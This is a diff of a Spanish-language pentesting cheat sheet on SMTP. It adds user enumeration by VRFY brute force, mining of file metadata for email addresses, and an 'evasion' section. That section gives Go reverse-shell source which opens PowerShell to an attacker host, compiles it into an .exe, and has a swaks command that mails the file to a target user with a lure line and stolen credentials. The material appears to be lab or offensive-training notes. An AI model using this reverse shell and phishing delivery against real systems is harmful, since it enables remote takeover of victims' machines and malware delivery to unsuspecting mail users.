@@ -2,17 +2,25 @@
 
 Tags: #SMTP
 
+**SMTP** significa _Simple Mail Transfer Protocol_. Es el protocolo que se usa principalmente para **enviar correos**: desde tu cliente al servidor de correo y entre servidores.
+
+## Enumeración 
 ```bash
 ❯ snmp-check IP    # Enumerar información de un dispositivo
 ```
 
 ```bash 
-❯ smtp_user_enum -M VRFY -U users.txt -t ❮IP❯ # Ataque de Fuerza bruta para identificar usuarios 
+❯ smtp-user-enum -M VRFY -U users.txt -t ❮IP❯   # Ataque de Fuerza bruta para identificar usuarios 
 
 	# VRFY = Verificar una lista de usuarios 
 	# U = Lista de usuarios 
 ```
 
+```bash 
+❯ exiftool mail_doc.pdf    # Mirar los metadatos del archivo. A veces se encuentran correos de los usuarios 
+```
+
+## Autenticación 
 ```bash 
 ❯ telnet <IP> 25              # Conectar al servicio SMTP
 	❯ HELP                    # Mostrar los comandos a ingresar 
@@ -28,6 +36,59 @@ Tags: #SMTP
 		❯ Yonf6hU7Vop         # Colocar la password en base64 
 
 	❯ QUIT                    # Salir de la sesión 
+```
+
+## Enviar un correo con un .exe malicioso (Evasión)
+```bash 
+Paso 1:
+❯ nvim 0xb0b.go    # Crear el archivo con la revershell 
+
+	package main
+	import (
+	    "net"
+	    "os/exec"
+	)
+	func main() {
+	    c, _ := net.Dial("tcp", "IP_Kali:4445")
+	    cmd := exec.Command("powershell")
+	    cmd.Stdin = c
+	    cmd.Stdout = c
+	    cmd.Stderr = c
+	    cmd.Run()
+	}
+```
+
+```bash 
+Paso 2:
+# Compilar y obtener el ejecutable malicioso (0xb0b.exe)
+❯ go build -o 0xb0b.exe 0xb0b.go
+```
+
+```bash 
+Paso 3: # Envíar el correo con el .exe malicioso con credenciales válidas (password, correo). El correo y password se válidan en el servicio de 'POP3'. El correo se obtiene de algún archivo, a veces este se encuentra en los metadatos.
+
+ 
+swaks \
+  --to 'TargetUser@company.com' \
+  --from 'ControlledAccount@company.com' \
+  --header 'Subject: mail_doc - executable' \
+  --body 'Here is the executable you asked for:' \
+  --attach-type application/octet-stream \
+  --server IP_Server \
+  --port 25 \
+  --timeout 20s \
+  --auth LOGIN \
+  --auth-user 'ControlledAccount@company.com' \
+  --auth-password 'P@$$w0rd123!' \
+  --attach @0xb0b.exe
+
+# Parámetros
+	# to = Usuario al que se le enviará el correo con el ejecutable 
+	# from = Quien envía el correo 
+	# server = Es la IP del server 
+	# auth-user = Usuario del cual se tiene un correo válido 
+	# auth-password = Es la contraseña válida del usuario 
+	# attach = Es el ejecutable anteriormente compilado con la revershell 
 ```
 
 ## Enviar código PHP en SMTP
